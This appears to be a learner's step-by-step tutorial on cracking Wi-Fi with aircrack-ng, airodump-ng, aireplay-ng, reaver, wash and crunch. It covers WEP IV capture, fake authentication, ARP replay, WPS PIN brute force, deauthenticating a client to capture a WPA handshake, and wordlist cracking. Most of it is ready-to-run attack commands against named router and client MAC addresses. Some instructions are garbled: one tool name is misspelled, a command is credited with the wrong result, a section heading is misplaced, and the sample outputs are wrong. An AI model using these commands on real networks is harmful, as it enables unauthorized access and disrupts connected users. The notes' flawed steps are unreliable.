# WEP Cracking:
- Wired Equivalent Privacy
- Old encryption
- Uses an algorithm called "RC4"
- Still used in some networks
- Can be cracked easily.

## Weekness
- Client encrypts data using a key
- Encrypted packet sent in the air
- Router decrypts packet using the key.

- Each packet is encrypted using a unique key stream.
- Random initialization vector (IV) is used to generate the keys streams.
- The initialization vector is only 24bits!
- IV is sent in plain text.
- IV + Key (password) = Key stream

## Result
- IV's will repeat on busy networks.
- This marks WEP vulnerable to statistical attacks.
- Repeated IVs can be used to determine the key stream
- And break the encryption

## Conclusion
To crack WEP we need to:
- Capture a large number of packets/IVs. --> using **airodump-ng**
- Analyse the captured IVs and crack the key. --> using **aircrack-ng**

First convert managed mode to monitor mode.
```bash
airodump-ng --bssid F8:23:B2:B9:50:A8 --channel 1 --write basic_wep wlan0
```
Now execute the below command,
```bash
aircrack-ng basic_wep-01.cap
```
You can get a result like this --> "KEY FOUND! [ 41:73:32:33:70 ] (ASCII: As23p)". Sometimes, the "ASCII" will be not shown. Now simply remove the : from the key (like 4173323370) and use it to connect with the network.

## Problem coulb be when:
- If network is not busy.
- It would take some time to capture enogh IVs

The **solution** of these problems are -->
- Force the AP to generate new IVs.

## Fake Authentication:
Problem:
- APs only communicate with connected clients.
- We can't communicate with it.
- We can't even start the attack

**Solution**-->
- Associate with the AP before launching the attack.

Execute below comands one-by-one.\
Step 1: Don't close the process this execution

```bash
airodom-ng --bssid 64:16:F0:EC:7B:F3 --channel 6 --write arpreplay wlan0
```
Step 2:
```bash
aireplay-ng --fakeauth 0 -a  64:16:F0:EC:7B:F3 -h 48:5D:60:2A:45:25 wlan0
```
"-h 48:5D:60:2A:45:25" is the mac accdress of my wireless adaptar. The first 12 digits of option unspec of "wlan0" or some other interface.

**Problem-->**
- If network is not busy
- It would take some time to capture enough IVs.

**Solution-->**
- Force the AP to generate new IVs.

**ARP Request Replay:**
- Wait for an ARP packet.
- Capture it, and replay it (retransmit it)
- This causes the AP to produce another packet with a new IV.
- Keep doing this till we have enogh IVs to crack the key.

```bash
aireplay-ng --arpreplay -b  64:16:F0:EC:7B:F3 -h 48:5D:60:2A:45:25 wlan0
```
Now when the number of data is increasing, execute this. The file name should be that passed when track the network.
```bash
aircrack-ng arpreplay-01.cap
```
Any now, you will get the key like before.

# WPA / WPA2 Cracking:
- Both can be cracked using the same methods like WEP
- Made to address the issues in WEP
- Much more secure
- Each packet is encrypted using a unique temporary key.

--> Packets contain no useful information.

## ARP Request Replay
- WPS is a feature that can be used with WPA & WPA2
- Allows clients to connect without the password
- Authencation is done using an 8 digit pin.
	- 8 digit is very small
	- We can try all possible pins in relatively short time.
	- Then the WPS pin can be used to compute the actual password.
	
P.S: The only works if the router is configured not to use PBC (Push Button Authentication).

## Hacking WPA & WPA2 Without a Wordlist:
Check which are available the WPS enabled. Before it, switch to monitor mode
```bash
wash --interface wlan0
```
For every possible pin to attack, first execute
```bash
reaver --bssid 0:10:18:90:2D:EE --channel 1 --interface wlan0 -vvv --no-associate
```
"-vvv" is to show as much information as possible. "--no-associate" is not to associate with the target network.

Execute below command to attack the WPA/WPA2 router. If push button is enabled, this attack might be failed.
```bash
aireplay-ng --fakeauth 30 -a 00:10:18:90:2D:EE -h 48:5D:60:2A:45:25 wlan0
```
"00:10:18:90:2D:EE" is the router mac address and "48:5D:60:2A:45:25" is the first 12 digit unspec option value of the interface. After successful execution of the process, you will get the pin like **WPS PIN: '12345670'**

## Capturing The Handshake:
- Fixed all weaknesses in WEP
- Packets contain no useful data.
- Only packets that can aid with the cracking process are the handshake packets.
	- There are 4 packets sent when a client connects to the network.

First check the routers
```bash
airodump-ng wlan0
```
Capture and store the data of that router
```bash
airodump-ng --bssid F0:B4:D2:62:54:BF --channel 6 --write wpa_handshake wlan0
```
Then have to wait unlit a new client is joined to this router to capture the handshake. But it is very time consuming. For that, we will disconnect one client from the router. Then we will stop the disconnection process of that client, then that client will automatically connect to the router again and that time we will capture the handshake packets. 
```bash
aireplay-ng --deauth 4 -a F0:B4:D2:62:54:BF -c 80:91:33:4E:7A:19 wlan0
```
"F0:B4:D2:62:54:BF" is the target router and "80:91:33:4E:7A:19" is our target client. And you will get the handshake [WPA handshake
: 00:10:18:90:2D:EE]

## Creating a Wordlist:
- The handshake does not contain data the helps recover the key.
- It contains data that can be used to check if a key is valid or not.

Crunch can be used to create a wordlist.

Syntax:
```bash
crunch [min] [max] [characters] -t [pattern] -o [Filename]

Example

crunch 6 8 123abc$ -o wordlist -t a@@@@b
```
Generated passes:
- aaaaab
- aabbbb
- aan$$b

## Cracking WPA & WPA2 Using a wordlist attack:
Two things needed to crack WPA/WPA2:
1. 4-way handshake
2. Wordlist

Execute below command to find out the key:
```bash
aircrack-ng wpa_handshake-01.cap -w test.txt
```
This will check all possible combinations and if it finds, then you will get the key of that router. It takes time according to size and number of possible combinations of text.txt file.